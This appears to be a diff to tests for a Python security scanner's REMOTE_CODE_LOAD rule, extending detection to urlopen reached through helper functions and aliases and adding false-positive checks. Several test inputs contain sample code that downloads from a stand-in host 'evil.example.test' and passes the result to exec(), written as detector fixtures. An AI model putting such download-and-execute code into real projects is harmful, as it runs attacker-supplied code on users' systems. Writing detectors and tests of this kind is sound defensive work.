@@ -413,19 +413,65 @@ def test_remote_staged_exec_quiet_for_class_method_named_urlopen():
     assert "REMOTE_STAGED_EXEC" not in _rules(src)
 
 
-def test_remote_code_load_bare_name_helper_hop_remains_out_of_scope():
-    """B-927 is deliberately scoped to the B-284 staged-write correlation
-    (REMOTE_STAGED_EXEC/REMOTE_STAGED_IMPORT) only -- REMOTE_CODE_LOAD's own call
-    into `_remote_returning_funcs`/`_remote_fetch_tainted_names` never receives
-    `facts`, so a bare-name `urlopen` reaching exec() through a local helper's
-    return value (the ONE case this rule exists for) still does not fire. This pins
-    the boundary so a future change does not silently widen it without its own
-    C-135 pass."""
+def test_remote_code_load_bare_name_helper_hop_now_recognized():
+    """B-993: `_remote_code_load_findings` now receives `facts` (threaded exactly the
+    way B-927 threaded it into the REMOTE_STAGED_EXEC call site), so a bare-name
+    `urlopen` reaching exec() through a local helper's return value (the ONE case
+    this rule exists for) FIRES now -- previously this was a confirmed, deliberately
+    scoped-out gap (see the retracted assertion this test replaces); B-993 closed it
+    on REMOTE_CODE_LOAD's own merits."""
     src = (
         "from urllib.request import urlopen\n\n"
         "def _load(url):\n"
         '    return urlopen(url, timeout=5).read().decode("utf-8", "ignore")\n\n'
         'code = _load("https://evil.example.test/l.py")\n'
+        "exec(code)\n"
+    )
+    found = [af for af in analyze_python(src, "x.py") if af.rule == "REMOTE_CODE_LOAD"]
+    assert found, f"expected REMOTE_CODE_LOAD, got {_rules(src)}"
+    assert found[0].severity == "crit"
+
+
+def test_remote_code_load_bare_name_aliased_import_still_fires():
+    """B-993: the alias spelling (`from urllib.request import urlopen as fetch`) must
+    resolve through `facts.dotted()` too, matching B-927's own aliasing coverage for
+    REMOTE_STAGED_EXEC (`test_remote_staged_exec_bare_name_aliased_import`)."""
+    src = (
+        "from urllib.request import urlopen as fetch\n\n"
+        "def _load(url):\n"
+        '    return fetch(url, timeout=5).read().decode("utf-8", "ignore")\n\n'
+        'code = _load("https://evil.example.test/l.py")\n'
+        "exec(code)\n"
+    )
+    found = [af for af in analyze_python(src, "x.py") if af.rule == "REMOTE_CODE_LOAD"]
+    assert found, f"expected REMOTE_CODE_LOAD, got {_rules(src)}"
+
+
+def test_remote_code_load_quiet_for_urlopen_aliased_from_unrelated_stdlib():
+    """FP-safety probe (B-993, same bar B-927 already established): a bare `urlopen`
+    aliased from an UNRELATED stdlib function (`shutil.which`, not
+    `urllib.request.urlopen`) must never be treated as a network fetch just because
+    of its local name."""
+    src = (
+        "from shutil import which as urlopen\n\n"
+        "def _load(name):\n"
+        "    return urlopen(name)\n\n"
+        'code = _load("python3")\n'
+        "exec(code)\n"
+    )
+    assert "REMOTE_CODE_LOAD" not in _rules(src)
+
+
+def test_remote_code_load_quiet_for_urlopen_imported_from_unrelated_module():
+    """FP-safety probe (B-993): `urlopen` imported from a module that is NOT
+    `urllib.request` must never be treated as a network fetch just because of its
+    bare name -- mirrors
+    `test_remote_staged_exec_quiet_for_urlopen_imported_from_unrelated_module`."""
+    src = (
+        "from mycompany.netutil import urlopen\n\n"
+        "def _load(url):\n"
+        "    return urlopen(url).read()\n\n"
+        'code = _load("https://internal.example/x")\n'
         "exec(code)\n"
     )
     assert "REMOTE_CODE_LOAD" not in _rules(src)
